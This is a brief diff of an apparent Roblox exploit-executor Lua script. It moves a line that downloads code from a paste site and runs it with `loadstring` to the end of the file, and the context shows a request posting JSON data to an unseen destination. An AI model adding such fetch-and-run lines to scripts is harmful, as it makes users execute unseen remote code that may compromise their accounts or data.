@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
+
 getgenv().EjecutarsePrimero = true
 
 local HttpService = game:GetService("HttpService")
@@ -43,3 +43,4 @@ pcall(function()
         Body = jsonData
     })
 end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
